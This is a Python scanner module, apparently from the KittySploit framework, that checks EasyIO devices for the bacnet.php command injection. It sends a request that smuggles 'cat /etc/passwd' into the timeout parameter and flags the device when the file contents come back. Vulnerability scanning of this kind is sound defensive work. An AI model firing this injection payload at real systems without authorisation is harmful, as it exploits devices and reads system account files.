#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""EasyIO bacnet.php command injection."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'EasyIO - bacnet.php RCE Detection',
        'description': (
            'Detects EasyIO command injection via '
            '/sdcard/cpt/scripts/bacnet.php timeout=0%26cat%20/etc/passwd.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'easyio', 'iot', 'rce', 'cmdi', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'risk_signal', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://ics-cert.us-cert.gov/advisories/ICSA-17-017-01',
        ],
    }

    def run(self):
        path = (
            '/sdcard/cpt/scripts/bacnet.php?action=discoverDevices'
            '&lowLimit=0&highLimit=0&timeout=0%26cat%20/etc/passwd'
        )
        r = self.http_request(
            method='GET',
            path=path,
            headers={'X-Requested-With': 'XMLHttpRequest'},
            allow_redirects=False,
        )
        if not r:
            return False
        body = r.text or ''
        if re.search(r'root:.*:0:0:', body) and 'SUCCESS' in body:
            self.set_info(
                severity='critical',
                reason='EasyIO bacnet.php command injection',
                path='/sdcard/cpt/scripts/bacnet.php',
            )
            return True
        return False
